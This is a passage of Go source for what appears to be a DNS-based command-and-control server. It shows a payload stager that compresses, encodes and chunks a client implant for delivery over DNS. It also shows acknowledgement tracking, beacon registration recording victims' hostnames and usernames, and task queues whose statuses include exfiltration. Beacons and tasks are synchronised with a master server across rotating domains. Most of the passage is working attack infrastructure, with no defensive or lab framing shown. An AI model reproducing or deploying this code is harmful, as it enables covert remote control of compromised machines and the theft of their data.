	possiblePaths := []string{
		filepath.Join("build", clientFilename),       // If running from project root
		filepath.Join("..", "build", clientFilename), // If running from Server/ directory
		filepath.Join(".", clientFilename),           // Same directory
		clientFilename,                               // Current directory
	}

	// Find the first existing path
	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			clientPath = path
			break
		}
	}

	// Check if we found a valid path
	if clientPath == "" {
		if !isDuplicate {
			logf("[C2] Error: Client binary not found. Tried paths: %v", possiblePaths)
		}
		return "ERROR|BINARY_NOT_FOUND"
	}

	if !isDuplicate {
		logf("[C2] Found client binary at: %s", clientPath)
	}

	// Read client binary
	clientData, err := os.ReadFile(clientPath)
	if err != nil {
		if !isDuplicate {
			logf("[C2] Error reading client binary: %v", err)
		}
		return "ERROR|READ_FAILED"
	}

	if !isDuplicate {
		logf("[C2] Loaded client binary: %s (%d bytes)", clientPath, len(clientData))
	}

	// Compress with gzip (use bytes.Buffer so we preserve raw binary data)
	var compressedBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&compressedBuf)
	_, err = gzWriter.Write(clientData)
	if err != nil {
		if !isDuplicate {
			logf("[C2] Error compressing client: %v", err)
		}
		return "ERROR|COMPRESS_FAILED"
	}
	gzWriter.Close()

	compressed := compressedBuf.Bytes()
	if !isDuplicate {
		logf("[C2] Compressed client: %d bytes -> %d bytes (%.1f%% reduction)",
			len(clientData), len(compressed),
			100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
	}

	// Base64 encode
	base64Data := base64.StdEncoding.EncodeToString(compressed)
	if !isDuplicate {
		logf("[C2] Base64 encoded: %d bytes", len(base64Data))
	}

	// Split into chunks (370 bytes - DNS-safe for 512-byte UDP limit)
	const chunkSize = 370
	var chunks []string
	for i := 0; i < len(base64Data); i += chunkSize {
		end := i + chunkSize
		if end > len(base64Data) {
			end = len(base64Data)
		}
		chunks = append(chunks, base64Data[i:end])
	}

	if !isDuplicate {
		logf("[C2] Stager deployment initiated: %s (%s/%s) - %d chunks (%d bytes each)",
			stagerIP, stagerOS, stagerArch, len(chunks), chunkSize)
	}

	// Generate session ID for standalone mode (4-char random ID to keep DNS packets small)
	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))

	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
	// This allows the stager to send ACKs through different DNS resolvers
	session := &StagerSession{
		ClientIP:     stagerIP, // Use stager's IP from the STG message
		OS:           stagerOS,
		Arch:         stagerArch,
		Chunks:       chunks,
		TotalChunks:  len(chunks),
		CreatedAt:    time.Now(),
		LastActivity: time.Now(), // Initialize activity timestamp
	}

	c2.mutex.Lock()
	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP
	c2.mutex.Unlock()

	if !isDuplicate {
		logf("[C2] Stager session created: %s (%d chunks in standalone mode)", sessionID, len(chunks))
	}

	// Return metadata with session ID, chunk count, and checksum (matching distributed mode format)
	// Format: META|<session_id>|<total_chunks>|<sha256_checksum>
	// Checksum is empty in standalone mode (no Master database access)
	return fmt.Sprintf("META|%s|%d|", sessionID, len(chunks))
}

// handleStagerAck processes a stager acknowledgment for chunk delivery
// Format: ACK|chunk_index|stager_IP|session_ID (in distributed mode)
// Format: ACK|chunk_index|stager_IP|hostname (in standalone mode)
func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	chunkIndex, err := strconv.Atoi(parts[1])
	if err != nil {
		if !isDuplicate {
			logf("[C2] Invalid chunk index from %s: %s", clientIP, parts[1])
		}
		return "ERROR|INVALID_INDEX"
	}

	stagerIP := parts[2]  // Extract stager's actual IP from ACK message
	sessionID := parts[3] // Session ID or hostname

	if !isDuplicate {
		logf("[C2] CHUNK request: index=%d, stager_ip=%s, session_id=%s", chunkIndex, stagerIP, sessionID)
	}

	// In distributed mode, check if this is a cached session first
	if masterClient != nil && c2.db != nil {
		// Check if this is a cached session (created from local cache)
		c2.mutex.RLock()
		cachedSession, isCached := c2.cachedStagerSessions[sessionID]
		c2.mutex.RUnlock()

		if isCached {
			// Serve from local cache!
			chunkData, err := c2.db.GetCachedChunk(cachedSession.ClientBinaryID, chunkIndex)
			if err == nil && chunkData != "" {
				if !isDuplicate {
					logf("[C2] 🚀 Serving chunk %d from cache (session: %s)", chunkIndex, sessionID)
				}

				// Update cached session stats
				c2.mutex.Lock()
				cachedSession.ChunksServed++
				cachedSession.LastActivity = time.Now()
				c2.mutex.Unlock()

				// Report chunk delivery to Master (async, with smart batching)
				// Report frequently at start, then batch, then frequently at end
				shouldReport := false
				if chunkIndex < 20 {
					// Report first 20 chunks individually for immediate feedback
					shouldReport = true
				} else if chunkIndex >= cachedSession.TotalChunks-20 {
					// Report last 20 chunks individually for accurate completion
					shouldReport = true
				} else if chunkIndex%10 == 0 {
					// Report every 10th chunk in the middle (was 50)
					shouldReport = true
				}

				if shouldReport && !isDuplicate {
					go func() {
						err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
						if err != nil && c2.debug {
							logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
						}
					}()
				}

				return fmt.Sprintf("CHUNK|%s", chunkData)
			}

			// Cache miss for this specific chunk - fall through to Master query
			if !isDuplicate {
				logf("[C2] Cache miss for chunk %d in cached session, querying Master", chunkIndex)
			}
		}

		// Not a cached session OR cache miss - try regular cache lookup
		cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
		if err == nil && cachedChunk != "" {
			if !isDuplicate {
				logf("[C2] Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID)
			}
			return fmt.Sprintf("CHUNK|%s", cachedChunk)
		}

		// Full cache miss - query Master
		if !isDuplicate {
			logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID)
		}

		chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
		if err != nil {
			if !isDuplicate {
				logf("[C2] Failed to get chunk from Master: %v", err)
			}
			return "ERROR|CHUNK_UNAVAILABLE"
		}

		// Cache the chunk for future requests (fire and forget)
		if c2.db != nil {
			go func(sid string, idx int, data string) {
				if err := c2.db.CacheChunk(sid, idx, data); err != nil {
					logf("[C2] Warning: Failed to cache chunk %d: %v", idx, err)
				}
			}(sessionID, chunkIndex, chunkResp.ChunkData)
		}

		if !isDuplicate {
			logf("[C2] Serving chunk %d/%d for stager %s (session: %s)",
				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID)
		}

		// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
		return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData)
	} // Standalone mode - look up local session
	c2.mutex.RLock()
	session, exists := c2.stagerSessions[stagerIP]
	c2.mutex.RUnlock()

	if !exists {
		if !isDuplicate {
			logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
		}
		return "ERROR|NO_SESSION"
	}

	// Update last activity timestamp to keep session alive during active downloads
	c2.mutex.Lock()
	now := time.Now()
	session.LastActivity = now

	// Initialize start time on first chunk
	if chunkIndex == 0 && session.StartedAt.IsZero() {
		session.StartedAt = now
	}
	c2.mutex.Unlock()

	// Validate chunk index
	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
		if !isDuplicate {
			logf("[C2] Invalid chunk index %d (total: %d) from %s",
				chunkIndex, session.TotalChunks, clientIP)
		}
		return "ERROR|INDEX_OUT_OF_RANGE"
	}

	// Get the requested chunk
	chunk := session.Chunks[chunkIndex]

	if !isDuplicate {
		// Only update progress bar if this is a NEW chunk (different from last one)
		c2.mutex.Lock()
		if session.LastChunk == nil || *session.LastChunk != chunkIndex {
			// Update last chunk sent
			session.LastChunk = &chunkIndex
			c2.mutex.Unlock()

			// Display progress bar instead of individual log lines (outside lock)
			c2.logStagerProgress(session, chunkIndex, stagerIP)
		} else {
			c2.mutex.Unlock()
		}
	}

	// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
	// The stager expects: CHUNK|<base64_data>
	return fmt.Sprintf("CHUNK|%s", chunk)
}

// AddTask adds a new task for a specific beacon
func (c2 *C2Manager) AddTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate task ID
	c2.taskCounter++
	taskID := fmt.Sprintf("T%04d", c2.taskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	// Save task to database (async to avoid blocking)
	if c2.db != nil {
		go func(t *Task) {
			if err := c2.db.SaveTask(t); err != nil && c2.debug {
				logf("[C2] Failed to save task to database: %v", err)
			}
		}(task)
	}

	// Add to beacon's task queue
	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
		return taskID
	}

	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
	return ""
}

// AddDomainUpdateTask adds a domain update task (DNS-server-initiated)
// Uses "D" prefix (D0001, D0002) instead of "T" to avoid conflicts with Master task IDs
func (c2 *C2Manager) AddDomainUpdateTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate domain update task ID with D prefix
	c2.domainTaskCounter++
	taskID := fmt.Sprintf("D%04d", c2.domainTaskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	// Save task to database (async to avoid blocking)
	if c2.db != nil {
		go func(t *Task) {
			if err := c2.db.SaveTask(t); err != nil && c2.debug {
				logf("[C2] Failed to save domain update task to database: %v", err)
			}
		}(task)
	}

	// Add to beacon's task queue
	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
		logf("[C2] Added domain update task %s for beacon %s", taskID, beaconID)
		return taskID
	}

	logf("[C2] ERROR: Beacon %s not found when adding domain update task %s", beaconID, taskID)
	return ""
}

// AddTaskFromMaster adds a task received from the master server
// In Shadow Mesh mode, all DNS servers use the same Master task ID - no local IDs
func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// SHADOW MESH: Use Master's task ID directly (all servers use same ID)
	// This ensures beacons use consistent task IDs when rotating between servers
	taskID := masterTaskID

	// Check if task already exists (don't re-add completed/failed/executing tasks)
	if existingTask, exists := c2.tasks[taskID]; exists {
		// Task already synced, don't re-add
		if c2.debug {
			logf("[C2] Task %s already exists with status: %s", taskID, existingTask.Status)
		}

		// If task is completed/failed/partial/sent/exfiltrating, make sure it's NOT in the queue
		if existingTask.Status == "completed" || existingTask.Status == "failed" || existingTask.Status == "partial" ||
			existingTask.Status == "sent" || existingTask.Status == "exfiltrating" {
			// Remove from queue if it somehow got in there
			if beacon, beaconExists := c2.beacons[beaconID]; beaconExists {
				newQueue := []Task{}
				removed := false
				for _, queuedTask := range beacon.TaskQueue {
					if queuedTask.ID != taskID {
						newQueue = append(newQueue, queuedTask)
					} else {
						removed = true
					}
				}
				if removed && c2.debug {
					logf("[C2] CRITICAL: Removed executing/completed task %s (status: %s) from beacon %s queue",
						taskID, existingTask.Status, beaconID)
				}
				beacon.TaskQueue = newQueue
			}
		}

		return taskID
	}

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task
	// No need for masterTaskIDs mapping - we use Master ID directly

	// Save task to database (async to avoid blocking)
	if c2.db != nil {
		go func(t *Task) {
			if err := c2.db.SaveTask(t); err != nil && c2.debug {
				logf("[C2] Failed to save task to database: %v", err)
			}
		}(task)
	}

	// Add to beacon's task queue if beacon exists locally
	if beacon, exists := c2.beacons[beaconID]; exists {
		// CRITICAL: Don't add if this is the beacon's current task
		if beacon.CurrentTask == taskID {
			if c2.debug {
				logf("[C2] Task %s is already CurrentTask for beacon %s (not adding to queue)", taskID, beaconID)
			}
			return taskID
		}

		// Check if task is already in queue (prevent duplicates from re-sync)
		alreadyQueued := false
		for _, queuedTask := range beacon.TaskQueue {
			if queuedTask.ID == taskID {
				alreadyQueued = true
				break
			}
		}

		if !alreadyQueued {
			beacon.TaskQueue = append(beacon.TaskQueue, *task)
			logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
		} else if c2.debug {
			logf("[C2] Task %s already queued for beacon %s (skipping duplicate)", taskID, beaconID)
		}
	} else {
		// Beacon doesn't exist yet on this DNS server (will be synced from Master)
		// Task is saved in c2.tasks and will be queued when beacon checks in
		if c2.debug {
			logf("[C2] Task %s created for beacon %s (beacon not on this DNS server yet, will queue on first check-in)", taskID, beaconID)
		}
	}

	return taskID
}

// GetBeacons returns all registered beacons
func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Beacon)
	for id, beacon := range c2.beacons {
		result[id] = beacon
	}
	return result
}

// SetKnownDomains updates the list of known active DNS domains from Master
func (c2 *C2Manager) SetKnownDomains(domains []string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	c2.knownDomains = domains
	if c2.debug {
		logf("[C2] Updated known domains: %v", domains)
	}
}

// GetKnownDomains returns the list of known active DNS domains
func (c2 *C2Manager) GetKnownDomains() []string {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()
	// Return a copy to prevent external modification
	result := make([]string, len(c2.knownDomains))
	copy(result, c2.knownDomains)
	return result
}

// SyncBeaconFromMaster adds or updates a beacon from master server
// This allows DNS servers to be aware of beacons registered on other servers
func (c2 *C2Manager) SyncBeaconFromMaster(beaconData BeaconData) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Check if beacon already exists locally
	beacon, exists := c2.beacons[beaconData.ID]

	if !exists {
		// Create new beacon from master data
		beacon = &Beacon{
			ID:        beaconData.ID,
			Hostname:  beaconData.Hostname,
			Username:  beaconData.Username,
			OS:        beaconData.OS,
			Arch:      beaconData.Arch,
			IPAddress: beaconData.IPAddress,
			LastSeen:  time.Now(), // Use current time for sync
			TaskQueue: []Task{},
		}
		c2.beacons[beaconData.ID] = beacon

		if c2.debug {
			logf("[C2] Synced beacon from master: %s (%s@%s)", beaconData.ID, beaconData.Username, beaconData.Hostname)
		}

		// Save to local database
		if c2.db != nil {
			go func(b *Beacon) {
				if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
					logf("[C2] Failed to save synced beacon to database: %v", err)
				}
			}(beacon)
		}
	} else {
		// Update existing beacon info (but don't override LastSeen from local check-ins)
		beacon.IPAddress = beaconData.IPAddress
		// Note: We don't update LastSeen here because local check-ins are more accurate
	}
}

// UpdateTaskStatusFromMaster updates a task status from Master and clears beacon.CurrentTask if completed
// This is called when Master completes task reassembly in Shadow Mesh mode
func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// SHADOW MESH: We use Master task IDs directly, no mapping needed
	taskID := masterTaskID

	// Update the task status
	task, exists := c2.tasks[taskID]
	if !exists {
		if c2.debug {
			logf("[DEBUG] Task %s not found locally (may have been created on different DNS server)", masterTaskID)
		}
		return
	}

	oldStatus := task.Status

	// Update to new status (handle all states: sent, exfiltrating, completed, failed, partial)
	task.Status = status

	if c2.debug && oldStatus != status {
		logf("[DEBUG] Updated task %s status from master: %s → %s", taskID, oldStatus, status)
	}

	// If task is sent/exfiltrating on another DNS server, remove from local queue
	if status == "sent" || status == "exfiltrating" {
		if beacon, beaconExists := c2.beacons[task.BeaconID]; beaconExists {
			// Remove from queue if present (another DNS server is handling it)
			newQueue := []Task{}
			removed := false
			for _, queuedTask := range beacon.TaskQueue {
				if queuedTask.ID != taskID {
					newQueue = append(newQueue, queuedTask)
				} else {
					removed = true
				}
			}
			if removed && c2.debug {
				logf("[DEBUG] Removed task %s from beacon %s queue (being handled by another DNS server)", taskID, task.BeaconID)
			}
			beacon.TaskQueue = newQueue
		}
	}

	// CRITICAL: Clear the beacon's current task when completed/failed/partial
	if status == "completed" || status == "failed" || status == "partial" {
		if beacon, beaconExists := c2.beacons[task.BeaconID]; beaconExists {
			if beacon.CurrentTask == taskID {
				beacon.CurrentTask = ""
				if c2.debug {
					logf("[DEBUG] Cleared current task for beacon %s (task %s marked %s by Master)", task.BeaconID, taskID, status)
				}
			}
		}
	}

	// Update database
	if c2.db != nil {
		go func(tid, st string) {
			if err := c2.db.UpdateTaskStatus(tid, st); err != nil && c2.debug {
				logf("[C2] Failed to update task status in database: %v", err)
			}
		}(taskID, status)
	}
}

// GetTasks returns all tasks
func (c2 *C2Manager) GetTasks() map[string]*Task {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Task)
	for id, task := range c2.tasks {
		result[id] = task
	}
	return result
}

// GetBeaconTasks retrieves all tasks for a specific beacon from the database
// This includes both in-memory and historical tasks
func (c2 *C2Manager) GetBeaconTasks(beaconID string) ([]*Task, error) {
	if c2.db == nil {
		// Fallback to in-memory only if DB not available
		c2.mutex.RLock()
		defer c2.mutex.RUnlock()

		var tasks []*Task
		for _, task := range c2.tasks {
			if task.BeaconID == beaconID {
				tasks = append(tasks, task)
			}
		}
		return tasks, nil
	}

	// Query from database for complete history
	return c2.db.GetTasksForBeacon(beaconID)
}

// GetTaskHistory retrieves all tasks with optional filtering
// Returns tasks from database for complete historical view
func (c2 *C2Manager) GetTaskHistory(status string, limit int) ([]*Task, error) {
	if c2.db == nil {
		// Fallback to in-memory only if DB not available
		c2.mutex.RLock()
		defer c2.mutex.RUnlock()

		var tasks []*Task
		for _, task := range c2.tasks {
			if status == "" || task.Status == status {
				tasks = append(tasks, task)
				if limit > 0 && len(tasks) >= limit {
					break
				}
			}
		}
		return tasks, nil
	}

	// Query from database for complete history
	if status != "" {
		return c2.db.GetTasksByStatus(status, limit)
	}

	// Get all tasks with limit
	return c2.db.GetAllTasksWithLimit(limit)
}

// GetTaskWithResult retrieves a task and its result from database
// This ensures we get the complete task data even if not in memory
func (c2 *C2Manager) GetTaskWithResult(taskID string) (*Task, error) {
	// First check in-memory cache
	c2.mutex.RLock()
	if task, exists := c2.tasks[taskID]; exists {
		c2.mutex.RUnlock()
		return task, nil
	}
	c2.mutex.RUnlock()

	// If not in memory, query from database
	if c2.db == nil {
		return nil, fmt.Errorf("task not found and database not available")
	}

	task, resultData, err := c2.db.GetTaskWithResult(taskID)
	if err != nil {
		return nil, err
	}

	// Populate the result field
	if resultData != "" {
		task.Result = resultData
	}

	return task, nil
}
